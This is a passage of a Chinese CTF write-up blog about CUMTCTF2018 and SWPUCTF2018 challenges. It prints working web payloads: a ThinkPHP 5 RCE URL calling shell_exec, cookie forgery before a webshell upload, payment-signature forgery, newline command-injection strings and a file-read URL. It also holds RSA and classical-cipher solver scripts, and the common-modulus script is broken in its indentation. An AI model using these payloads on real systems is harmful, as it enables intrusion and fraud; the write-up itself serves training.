src="/2018/12/21/cumtctf2018/8.png" alt=""></p><p><img src="/2018/12/21/cumtctf2018/9.png" alt=""></p><p><img src="/2018/12/21/cumtctf2018/10.png" alt=""></p><!-- flag{07381475a76a457743733bb828c19b3c} --><h2 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h2><p>题目给出了版本号，直接搜索一下对应的版本cve发现一篇文章</p><blockquote><p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p></blockquote><p>题目给出了利用代码，直接尝试一下发现可以回显phpinfo页面，修改参数即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=cat%20../../../../flag</span><br></pre></td></tr></table></figure><p><img src="/2018/12/21/cumtctf2018/3.png" alt=""></p><hr><p>接下里是web题目的复现</p><h2 id="secret-system"><a href="#secret-system" class="headerlink" title="secret_system"></a>secret_system</h2><p>扫描一下目录，可以找到登录页面，查看源代码可以看到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>访问github仓库</p><p><img src="/2018/12/21/cumtctf2018/14.png" alt=""></p><p>题目给了test用户的登录密码，登录进去之后发现对应的cookie值，下一步就是伪造admin的cookie了，猜测admin的id应该为1，伪造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">'sign'</span>=&gt;md5(<span class="string">"1"</span>.<span class="string">"admin"</span>),</span><br><span class="line">);  </span><br><span class="line">$s = urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure><p>之后刷新即可以admin身份登录，之后就是上传webshell了，经过测试发现.pht后缀可以上传，上传即可getshell</p><h2 id="ezshop"><a href="#ezshop" class="headerlink" title="ezshop"></a>ezshop</h2><p>源码审计题目。开始没有思路，但是后面给了提示是签名伪造，查看源码在views.py中看到签名相关代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">form = &#123;</span><br><span class="line">        <span class="string">'order_id'</span>: o.id,</span><br><span class="line">        <span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line">        <span class="string">'good_id'</span>: o.good.id,</span><br><span class="line">        <span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line">        <span class="string">'good_price'</span>: o.good.price,</span><br><span class="line">        <span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">    &#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure><p>可以看到签名的构造过程，我们可以尝试构造一个分数高于888分的用户的信息伪装成该用户购买flag就可以成功完成交易，因为题目并没有验证交易者身份，但是哪个用户可以用呢，通过查看db.sqlite3数据库文件可以看到</p><blockquote><p>id|user_id|point<br>13|16|30000<br>14|17|120</p></blockquote><p>用户id为16的用户有30000积分足够购买flag，所以构造签名即可，坑点在于秘钥为 <code>zhinianyuxin\n</code> 我就是没看到换行才导致没有做出来…还是自己太菜了，抓包修改签名值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">"zhinianyuxin\n"</span></span><br><span class="line">form = &#123;</span><br><span class="line">        <span class="string">'order_id'</span>: <span class="string">"219"</span>,</span><br><span class="line">        <span class="string">'buyer_id'</span>: <span class="string">"16"</span>,</span><br><span class="line">        <span class="string">'good_id'</span>: <span class="string">"38"</span>,</span><br><span class="line">        <span class="string">'buyer_point'</span>: <span class="string">"30000"</span>,</span><br><span class="line">        <span class="string">'good_price'</span>: <span class="string">"888"</span>,</span><br><span class="line">        <span class="string">'order_create_time'</span>: <span class="string">"1545145742.903019"</span></span><br><span class="line">    &#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">m.update(str2sign.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(m.hexdigest())</span><br></pre></td></tr></table></figure><p>注意提交的时候相应的字段值也要修改一下，然后就可以看到flag了</p><p><img src="/2018/12/21/cumtctf2018/15.png" alt=""></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h2><p>题目很明显是共模攻击，但是密文编码格式一直不确定，base64,32等都没用，后面分析了一下频率，发现竟然只有10个字符！，按照外形对应一个0-9的数字，然后将文本转成10进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">"gbATZgI"</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="comment"># dic = ['Z', 'T', 'O', 'B', 'I', 'S', 'A', 'b', 'g', 'E']</span></span><br><span class="line">dic = [<span class="string">'O'</span>, <span class="string">'I'</span>,<span class="string">'Z'</span>,<span class="string">'E'</span>,<span class="string">'A'</span>,<span class="string">'S'</span>,<span class="string">'b'</span>,<span class="string">'T'</span>,<span class="string">'B'</span>,<span class="string">'g'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">ans += str(dic.index(i))</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>然后就是公模攻击了，网上找了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"> <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"> m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"> <span class="keyword">print</span> n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><!-- flag{49d91077a1abcb14f1a9d546c80be9ef} --><hr><p>下面是队友做出来的题目，一并记录一下</p><h2 id="古典密码签到题"><a href="#古典密码签到题" class="headerlink" title="古典密码签到题"></a>古典密码签到题</h2><p>​    由题目提示可知这题是棋盘密码，棋盘密码是多表代换，但并不知道加密所使用的密钥则无法进行解密。</p><p>根据所给的密文内容可知，密钥为k，s，y，n，b，个字符</p><div class="table-container"><table><thead><tr><th></th><th>k</th><th>s</th><th>y</th><th>n</th><th>b</th></tr></thead><tbody><tr><td>k</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td></tr><tr><td>s</td><td>F</td><td>G</td><td>H</td><td>I/J</td><td>K</td></tr><tr><td>y</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td></tr><tr><td>n</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td></tr><tr><td>b</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table></div><p>通过不断变换行列的k，s，y，n，b字符顺序进行爆破（其中行列字符顺序一致），找出含有关键字的明文消息。一共有5个字符的全排列，即5！种方式。</p><p>脚本参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/</a></p><p>通过itertools库中的permutations可实现对5个字符的全排列，固定密码表的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ksyssskkysynbssbbnynnb"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'ksynb'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">''</span>.join(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key <span class="keyword">in</span> key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))<span class="comment">#读取密文的坐标</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = int(solve_c[i])*<span class="number">5</span>+int(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        res += chr(now_ascii)<span class="comment">#对明文还原</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> now_key,res<span class="comment">#筛选明文和密钥</span></span><br></pre></td></tr></table></figure><h2 id="First-Level"><a href="#First-Level" class="headerlink" title="First Level"></a>First Level</h2><p>​    根据题目所给出的文本，有n,c,e，其中e=2不难看出这是RSA中Rabin的算法的特征。算法详情参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_e_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_e_attack/</a></p><p><img src="/2018/12/21/cumtctf2018/13.png" alt="0"></p><p>难点在于如何分解n得到p、q，进行下一步的破解。</p><p>尝试通过yafu分解，在<a href="http://www.factordb.com/查询，以及暴力分解素数都没有结果。最终在前人写的脚本中https://github.com/3summer/CTF-RSA-tool破解得到答案。" target="_blank" rel="noopener">http://www.factordb.com/查询，以及暴力分解素数都没有结果。最终在前人写的脚本中https://github.com/3summer/CTF-RSA-tool破解得到答案。</a></p><p>通过分析脚本发现，分解n的素数是在现成的文本里找到的，看样子是ctf中用的素数。</p><p><img src="/2018/12/21/cumtctf2018/12.png" alt="00"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pastctfprimes</span><span class="params">(N)</span>:</span></span><br><span class="line">    log.debug(<span class="string">'factor N: try past ctf primes'</span>)</span><br><span class="line">    primes = [long(x) <span class="keyword">for</span> x <span class="keyword">in</span> open(os.path.dirname(__file__)+ <span class="string">'/pastctfprimes.txt'</span>, <span class="string">'r'</span>).readlines(</span><br><span class="line">    ) <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">'#'</span>) <span class="keyword">and</span> <span class="keyword">not</span> x.startswith(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> prime <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> N % prime == <span class="number">0</span>:</span><br><span class="line">            q = prime</span><br><span class="line">            p = N / q</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><p>分析得到q是BKP ctf 2017所用到的素数</p><p>q=28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967</p><p>p=28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2018校赛第一轮月赛记录，做的有点不好，看了题目感觉都不是很难，自己放弃的太快了。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018复现</title>
    <link href="http://chaosec.top/2018/12/20/SWPUCTF2018/"/>
    <id>http://chaosec.top/2018/12/20/SWPUCTF2018/</id>
    <published>2018-12-20T05:00:25.000Z</published>
    <updated>2019-02-16T08:30:36.955Z</updated>
    
    <content type="html"><![CDATA[<p>题目复现</p><a id="more"></a><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>其它两道都很简单，就不记录了，只记录一下没做出来的</p><h2 id="唯有低头-才能出头"><a href="#唯有低头-才能出头" class="headerlink" title="唯有低头,才能出头"></a>唯有低头,才能出头</h2><p>做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密…，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br><span class="line">lookatthekeyboard</span><br></pre></td></tr></table></figure><!-- swpuctf{lookatthekeyboard} --><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X?"></a>用优惠码 买个 X?</h2><p>注册并登录之后，页面弹出一个优惠码 <code>uKnfZ2F0aFaZBFy</code> ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 <code>www.zip</code>，下载源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$pass = <span class="string">"b1o2OrrgqYPMkzK"</span>;</span><br><span class="line">$str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$len = strlen($str_rand) <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($pass); $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($i&lt;=(<span class="number">15</span>/<span class="number">2</span>))&#123;</span><br><span class="line">$number = strpos($str_rand,$pass[i]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$number = $len + <span class="number">1</span> - strpos($str_rand,$pass[i]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$number $number 0 $len"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样可以得到我们爆破的种子</p><p><img src="/2018/12/20/SWPUCTF2018/1.png" alt=""></p><p>然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可</p><p>然后就是后半段的命令执行绕过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于第一个首尾匹配直接 <code>%0a</code> 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1.1.1.1%0atail /&apos;fl&apos;ag</span><br></pre></td></tr></table></figure><p>方方土学长用的是<code>\</code>绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1.1.1.1%0atail /fl\ag</span><br></pre></td></tr></table></figure><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>查看文件出存在文件读取漏洞，利用该漏洞读取文件源码，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=index.php</span><br></pre></td></tr></table></figure><p>关键源码如下</p><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; 